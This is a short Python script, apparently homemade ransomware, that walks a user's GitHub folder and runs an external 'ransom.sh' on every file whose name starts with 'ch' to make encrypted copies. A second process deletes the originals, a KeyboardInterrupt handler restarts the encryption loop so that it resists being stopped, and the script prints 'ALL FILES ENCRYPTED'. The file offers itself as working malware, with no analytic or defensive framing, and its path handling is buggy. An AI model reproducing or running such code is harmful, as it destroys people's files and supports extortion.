import os
import multiprocessing

def ransom1():
    for x, y, z in os.walk("/home/potmor/Desktop/Github"):
        for i in z:
            if i[:2] != "ch":
                continue
            else:
                try:               
                    os.system(f"./ransom.sh {i} enc_{i}")
                except KeyboardInterrupt:
                    ransom1()
    
    print("ALL FILES ENCRYPTED")
def ransom2():
    from time import sleep
    sleep(0.5)
    for x, y, z in os.walk("/home/potmor/Desktop/Github"):
        for i in z:
            if i[:2] == "ch":
                os.system(f"rm {i}")
    
p1 = multiprocessing.Process(target = ransom1)
p2 = multiprocessing.Process(target = ransom2)
p1.start()
p2.start()
p1.join()
p2.join()